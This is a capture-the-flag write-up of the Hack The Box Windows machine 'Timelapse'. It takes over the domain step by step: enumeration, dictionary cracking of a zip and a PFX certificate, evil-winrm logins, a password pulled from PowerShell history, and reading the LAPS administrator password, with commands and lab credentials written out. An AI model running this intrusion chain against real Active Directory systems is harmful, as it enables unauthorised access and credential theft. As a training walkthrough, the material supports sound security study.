---
title: Timelapse - HTB Writeup
date: 2024-04-17 10:03
categories: [ctf, windows, easy, ad]
tags: [htb, windows, ctf, easy, timelapse, ad]    # TAG names should be lowercase
---

![Pasted image 20240417193544](https://github.com/iammR0OT/HTB/assets/74102381/d1bb0318-cd34-4421-aef1-b96c3ba964e1)


# User 

## Scanning through Nmap

First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p- --min-rate 10000 10.129.95.241 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49675,49721,49744
```

Now Let's run the depth scan on these specific ports using:

```bash
$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49675,49721,49744 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```shell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-19 01:29:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2023-07-19T01:30:44+00:00; +8h00m09s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
53634/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m08s, deviation: 0s, median: 8h00m08s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-19T01:30:04
|_  start_date: N/A

```

## Information Gathering

Through Nmap we found port **53 DNS** is open which can be used to perform zone transfer, **88 kerberose** is open which can be used to for enumeration purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, 389 **ldap** port is open, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credientials. Nmap discover Doamin name by using ldap scripts which is **timelapse.htb**. Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve domain

```shell
cat /etc/hosts | grep timelapse
10.10.11.152     timelapse.htb
```
### Port 53 DNS

Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be `dig axfr @10.10.11.152 timelapse.htb`. Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, AXFR queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```shell
dig axfr @10.10.11.152 timelapse.htb

; <<>> DiG 9.19.17-2~kali1-Kali <<>> axfr @10.10.11.152 timelapse.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### Port 88 Kerberose

Let's move towards our Enumeration next part which is port **88** kerberose. We can use it to enumerate user's because we don't have any valid credentials yet. To enumerate user in Domain, we will use tool called **kerbrute**(A tool to quickly bruteforce and enumerate valid Active Directory accounts through **Kerberos Pre-Authentication**) . it can also be used to perform password spraying on domain if somehow we managed to find a valid password. **Kerbrute** provide us many functions including

```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function. The command we will use will be `kerbrute userenum -d timelapse.htb  /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.152` here **-d** is for domain name and **--dc** for domain controller. But we didn't get any valid account because of i think some kind of firewall rules of security measures because it is blocking our login attempts wither using TCP or UDP.

```
kerbrute userenum -d timelapse.htb  /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.152

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/20/24 - Ronnie Flathers @ropnop

2024/01/20 04:54:28 >  Using KDC(s):
2024/01/20 04:54:28 >  	10.10.11.152:88

2024/01/20 04:54:36 >  [!] mike@timelapse.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to 10.10.11.152:88: sending over UDP failed to 10.10.11.152:88: read udp 10.10.10.10:37291->10.10.11.152:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/01/20 04:54:36 >  [!] 2000@timelapse.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to 10.10.11.152:88: sending over UDP failed to 10.10.11.152:88: read udp 10.10.10.10:44139->10.10.11.152:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
2024/01/20 04:54:36 >  [!] NULL@timelapse.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to 10.10.11.152:88: sending over UDP failed to 10.10.11.152:88: read udp 10.10.10.10:58586->10.10.11.152:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)

```

### Port 389 Ldap

Using **ldapsearch** we can enumerate user's in domain, domain [naming context](https://en.wikipedia.org/wiki/Naming_Context) etc. Let's First discover naming context of domain. The command will be `ldapsearch  -x -H ldap://10.10.11.152 -s base namingcontexts`
here **-x** for simple authentication, **-H** for host, **-s** to set scope to base and the **namingcontext** for getting naming context of domain

```shell
ldapsearch  -x -H ldap://10.10.11.152 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=timelapse,DC=htb
namingcontexts: CN=Configuration,DC=timelapse,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
namingcontexts: DC=DomainDnsZones,DC=timelapse,DC=htb
namingcontexts: DC=ForestDnsZones,DC=timelapse,DC=htb
```

Because we don't have valid ldap credentials, so we can't make successful session with ldap and can't enumerate user's and Anonymous login is blocked 

```shell
ldapsearch -x -b "dc=return,dc=local" "*" -H ldap://10.129.95.241        
# extended LDIF
#
# LDAPv3
# base <dc=timelapse,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: * 
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

### Enumerating User's using lookupsid.py

lookupsid.py: **A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups**.

```shell
lookupsid.py  timelapse.htb/anonymous@10.10.11.152  -no-pass 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.11.152
[*] StringBinding ncacn_np:10.10.11.152[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-671920749-559770252-3318990721
498: TIMELAPSE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: TIMELAPSE\Administrator (SidTypeUser)
501: TIMELAPSE\Guest (SidTypeUser)
502: TIMELAPSE\krbtgt (SidTypeUser)
512: TIMELAPSE\Domain Admins (SidTypeGroup)
513: TIMELAPSE\Domain Users (SidTypeGroup)
514: TIMELAPSE\Domain Guests (SidTypeGroup)
515: TIMELAPSE\Domain Computers (SidTypeGroup)
516: TIMELAPSE\Domain Controllers (SidTypeGroup)
517: TIMELAPSE\Cert Publishers (SidTypeAlias)
518: TIMELAPSE\Schema Admins (SidTypeGroup)
519: TIMELAPSE\Enterprise Admins (SidTypeGroup)
520: TIMELAPSE\Group Policy Creator Owners (SidTypeGroup)
521: TIMELAPSE\Read-only Domain Controllers (SidTypeGroup)
522: TIMELAPSE\Cloneable Domain Controllers (SidTypeGroup)
525: TIMELAPSE\Protected Users (SidTypeGroup)
526: TIMELAPSE\Key Admins (SidTypeGroup)
527: TIMELAPSE\Enterprise Key Admins (SidTypeGroup)
553: TIMELAPSE\RAS and IAS Servers (SidTypeAlias)
571: TIMELAPSE\Allowed RODC Password Replication Group (SidTypeAlias)
572: TIMELAPSE\Denied RODC Password Replication Group (SidTypeAlias)
1000: TIMELAPSE\DC01$ (SidTypeUser)
1101: TIMELAPSE\DnsAdmins (SidTypeAlias)
1102: TIMELAPSE\DnsUpdateProxy (SidTypeGroup)
1601: TIMELAPSE\thecybergeek (SidTypeUser)
1602: TIMELAPSE\payl0ad (SidTypeUser)
1603: TIMELAPSE\legacyy (SidTypeUser)
1604: TIMELAPSE\sinfulz (SidTypeUser)
1605: TIMELAPSE\babywyrm (SidTypeUser)
1606: TIMELAPSE\DB01$ (SidTypeUser)
1607: TIMELAPSE\WEB01$ (SidTypeUser)
1608: TIMELAPSE\DEV01$ (SidTypeUser)
2601: TIMELAPSE\LAPS_Readers (SidTypeGroup)
3101: TIMELAPSE\Development (SidTypeGroup)
3102: TIMELAPSE\HelpDesk (SidTypeGroup)
3103: TIMELAPSE\svc_deploy (SidTypeUser)
```

Here we got some valid user's on domain like, **svc_deploy, thecybergeek, babywyrm, sinfulz, payl0ad, legacyy**

### Port 139 & 445 SMB

We also have SMB ports open, let's try to list out smb shares if are available publicly using **smbclient**(The smbclient lets you **send messages to workstations, display browse lists and connect to SMB shares**). The command will be `smbclient -L \\10.10.11.152` here **-L** for list our shares. We have some shares accessible to us. 

```shell
smbclient -L \\10.10.11.152
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
```

In Dev folder i found one winrm_backup.zip file. Let's Download it into our local machine and check what's inside it.

<img width="574" alt="Pasted image 20240111132714" src="https://github.com/iammR0OT/HTB/assets/74102381/482bf9a1-977b-437f-99a6-3f577b5f28e5">


## Exploitation

When i tried to unzip the file, the file was password protected.

<img width="425" alt="Pasted image 20240111184342" src="https://github.com/iammR0OT/HTB/assets/74102381/dd09b11e-089a-4bdb-a6a1-972180f74d97">


So, I decided to crack it using **fcrackzip**(**fcrackzip** is a fast password cracker partly written in assembler. It is able to crack password protected zip files with brute force or dictionary based attacks, optionally testing with unzip its results. It can also crack **cpmask’ed** images). You can install it using `sudo apt install fcrackzip` 
in kali. The command will be `fcrackzip -u -v -D -p rockyou.txt winrm_backup.zip` here **-u** use unzip to weed out wrong passwords , **-v** for verbosity, **-D** for Dictionary attack and  **-p** is for use string as initial password/file. and within a second it cracked the zip file and the password is **supremelegacy
**
```shell
fcrackzip -u -v  -D -p rockyou.txt winrm_backup.zip 
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udehss                                  

PASSWORD FOUND!!!!: pw == supremelegacy
```

Now Let's unzip the file and extract the content stored in it. and we able to the extract the **legacy_dev_auth.pfx** file.

```shell
unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx 
```

### Dealing with .pfx file

**PFX** (Personal Exchange Format) file is a digital certificate file format used in **Microsoft Windows** and other systems to store a **private key** and a corresponding **public key certificate**, along with any intermediate certificates that may be necessary to establish the trust chain. PFX files are often used for importing and exporting certificates between different systems or applications. A PFX file is typically **password-protected** to prevent unauthorized access to the private key and the sensitive information it contains. When a PFX file is imported into a system or application, the password is required to unlock and access the private key.
 So now we first need to decrypt it to get the stored key's and for decryption we need password or key. So we will use tool called **crackpkcs12** to crack it's password. **crackpkcs12** is a tool to audit **PKCS#12** files passwords (extension **.p12** or **.pfx**). It's written in C and uses **openssl** library. You can download it from [here](https://github.com/crackpkcs12/crackpkcs12)
we will break its password using tool **crackpkcs12**. Here we will be using dictionary attack. 

```shell
$ crackpkcs12 -d /usr/share/seclists/SecLists-master/Passwords/Leaked-Databases/rockyou.txt legacyy_dev_auth.pfx -v

Dictionary attack - Starting 4 threads

Performance:              3231899 passwords [    2953 passwords per second]
*********************************************************
Dictionary attack - Thread 4 - Password found: thuglegacy
*********************************************************
```

Now let's Extract **.key** and **.crt** from **.pfx** file because SSL certificate (Public Key) and corresponding Private key are stored in **.pfx** file which is encrypted and unreadable. For better understanding give a it a look. [here](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) 

```shell
# Extract Key file
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

# Extract Certificate File.
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out crt.crt
Enter Import Password:

# Decrypting the Key
$ openssl rsa -in key.key -out dec_key.key
Enter pass phrase for key.key:
writing RSA key
```

## Evil-Winrm

**Evil-winrm** provide us ability to login into account using the private and the public key. **WinRM** (Windows Remote Management) is the Microsoft implementation of **WS-Management** Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.
This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port **5985**), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation **hacking/pentesting** phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.

```powershell
evil-winrm -i 10.10.11.152  -c crt.crt -k key.key -u -p  -S
                                        
Info: Establishing connection to remote endpoint
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

# Privilege Escalation

As when we get shell into a windows domain machine, the very first thing come in our brain is to check the valid user's accounts that are running in the Domain environment and we found only six valid user account's.

```powershell
C:\Users\legacyy\Documents> net user
Enter PEM pass phrase:
User accounts for \\
-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

After discovering user's Let's run **winpease.exe**(WinPEAS is a compilation of local Windows privilege escalation scripts to **check for cached credentials, user accounts, access controls, interesting files, registry permissions, service accounts, patch levels, and more**.). So first we need to run a **smbserver** in our attacking machine to host shares so that we can access it on victim machine. For this we will be using script called **smbserver.py** from impacket toolkit. 

```powershell
sudo smbserver.py share -username ab -password ab . -smb2support
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.152,53138)
[*] AUTHENTICATE_MESSAGE (\ab,DC01)
[*] User ab\DC01 authenticated successfully
```

Now mount the shares on victim machine so that we can access it there

```powershell
*Evil-WinRM* net use \\10.10.10.10\share /u:ab ab
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\Documents> cd \\10.10.10.10\share
```

Now run **winpease** on victim machine and save the output in a file **win_peas.txt** and analyze it using `cat`

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.10\share>./winPEASx64.exe cmd > win_peas.txt
```

After analyzing the win_peas output, an PowerShell backup file come in front of me. When i open it i found credentials of **svc_deploy** user.
	`svc_deploy  : E3R$Q62^12p7PLlC%KWaxuaV`

<img width="856" alt="Pasted image 20240119214052" src="https://github.com/iammR0OT/HTB/assets/74102381/e4107438-81f2-4862-a8b9-7c79b3397c67">

```powershell
*Evil-WinRM* PS C:\Users> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

### Shell as scv_deploy

Let's log into **svc_deploy** using **Evil-Winrm**. Here **-i** is for domain ip, **-u** for domain username, **-p** for user password and **-S** to enable SSL

```powershell
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S                                       
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Because we are in a Active Directory Domain environment, we will run **Sharphound**, an investigator used to gather information from all over the domain. **SharpHound** is preferable for looting. So first run a **smbserver** on our attacker machine and create shares and then access those shares on victim machine and run tools remotely. For this we will be using script called **smbserver.py** from **impacket** toolkit. 

```powershell
C:\Users\svc_deploy\Documents> net use \\10.10.10.10\share /u:ab ab
Enter PEM pass phrase:
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> cd \\10.10.10.10\share
Enter PEM pass phrase:
```

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.10\share> ./SharpHound.exe -c all
2024-01-20T07:54:16.5774527-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-01-20T07:54:20.4368309-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-20T07:54:23.4993328-08:00|INFORMATION|Initializing SharpHound at 7:54 AM on 1/20/2024
2024-01-20T07:54:27.8587016-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for timelapse.htb : dc01.timelapse.htb
2024-01-20T07:54:39.3274598-08:00|INFORMATION|Loaded cache with stats: 71 ID to type mappings.
 71 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-01-20T07:54:40.9368291-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-01-20T07:54:47.0305955-08:00|INFORMATION|Beginning LDAP search for timelapse.htb
2024-01-20T07:54:47.1087146-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-01-20T07:54:47.1087146-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-01-20T07:55:21.7493247-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-01-20T07:55:52.4524535-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-01-20T07:56:25.9524614-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-01-20T07:57:02.8070949-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-01-20T07:57:39.5471716-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2024-01-20T07:58:33.2180844-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2024-01-20T07:59:04.0675206-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2024-01-20T07:59:34.4680783-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2024-01-20T08:00:12.6264657-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2024-01-20T08:00:21.9837047-08:00|INFORMATION|Consumers finished, closing output channel
2024-01-20T08:00:22.0305886-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-01-20T08:00:42.6974341-08:00|INFORMATION|Status: 56 objects finished (+56 0.1577465)/s -- Using 40 MB RAM
Closing writers
2024-01-20T08:01:12.7024498-08:00|INFORMATION|Status: 112 objects finished (+56 0.2909091)/s -- Using 40 MB RAM
2024-01-20T08:01:18.5618265-08:00|INFORMATION|Status: 112 objects finished (+0 0.286445)/s -- Using 40 MB RAM
2024-01-20T08:01:18.5618265-08:00|INFORMATION|Enumeration finished in 00:06:31.5287572
2024-01-20T08:03:06.4680889-08:00|INFORMATION|Saving cache with stats: 71 ID to type mappings.
 71 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-01-20T08:03:14.2003439-08:00|INFORMATION|SharpHound Enumeration Completed at 8:03 AM on 1/20/2024! Happy Graphing!
```

Now the upload it to Bloodhound(**an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment**). To run Bloodhound we first need to start neo4j a graph database system. 

<img width="323" alt="Pasted image 20240120131255" src="https://github.com/iammR0OT/HTB/assets/74102381/db5a7930-e7e8-4260-be62-aab196daf0e0">

Now type simple bloodhound in new terminal and press enter to start the bloodhound. If you are running bloodhound for the first time you need to reset the default credentials of bloodhound which is `neo4j:neo4j`. After logging into the bloodhound upload the zip file we create by **Sharphound**. You can use both methods, either drag and drop the file into bloodhound or by using upload data button and wait for data to upload into the database.
After successfully uploading data, the investigation part come in. Mark both user's **legacy** and **svc_deploy** as owned by searching them in search bar and then right click on user and click **mark user as owned**

<img width="254" alt="Pasted image 20240120131457" src="https://github.com/iammR0OT/HTB/assets/74102381/bc8a61a4-274f-4ba4-a7a0-e68259b044a8">


Now go to Analysis tab and under **Shortest Path** tab select **Shortest Path to Domain Admins** from owned Principals. and There we discover that if somehow managed to access to computer **DC01**, we can perform DCSync attack on the domain.

<img width="746" alt="Pasted image 20240120131551" src="https://github.com/iammR0OT/HTB/assets/74102381/c0dbded5-7796-43b6-9fe6-675875124328">

After listing the properties of **svc_deploy** user, i discover that he is a member of Global group **LAPS_reader**
### LAPS

**Windows Local Administrator Password Solution** (Windows LAPS) is a Windows feature that automatically manages and backs up the password of a **local administrator** account on your Microsoft Entra joined or Windows Server Active Directory-joined devices. You also can use Windows LAPS to automatically manage and back up the Directory Services Restore Mode (DSRM) account password on your Windows Server Active Directory domain controllers. An authorized administrator can retrieve the DSRM password and use it. Passwords are protected in transit from the client to the server using Kerberos v5 and AES. For more you can read [here](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

When using LAPS, **2 new attributes** appear in the **computer** objects of the domain: `**ms-mcs-AdmPwd**` and `**ms-mcs-AdmPwdExpirationTime**`_._ These attributes contains the **plain-text admin password and the expiration time**. Then, in a domain environment, it could be interesting to check **which users can read** these attributes. In our case **svc_deploy** can read them. So we can use command `Get-ADComputer DC01 -property 'ms-mcs-admpwd'`

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.10\share> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : 3x5Ir9L7;Gd$6i62d,f3A+9w
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

## Shell as Root

Now we have the password of local admin account of domain computer DC01. Let's log into it and using evil-winrm

```powershell
evil-winrm -u administrator -p '3x5Ir9L7;Gd$6i62d,f3A+9w' -i timelapse.htb -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

After log into it we can see that we are in a group of **domain admin** .

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> net user administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/20/2024 7:47:48 AM
Password expires             Never
Password changeable          1/21/2024 7:47:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2022 5:33:53 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Enterprise Admins    *Group Policy Creator
                             *Domain Users         *Schema Admins
                             *Domain Admins
```
# Flags

 User : eedd2ab98feed....e25e29d32f1c5e5
 
 Root : a7147a3380fb2....a6e5f2f1d7385e1b
 
# Happy Hacking ❤
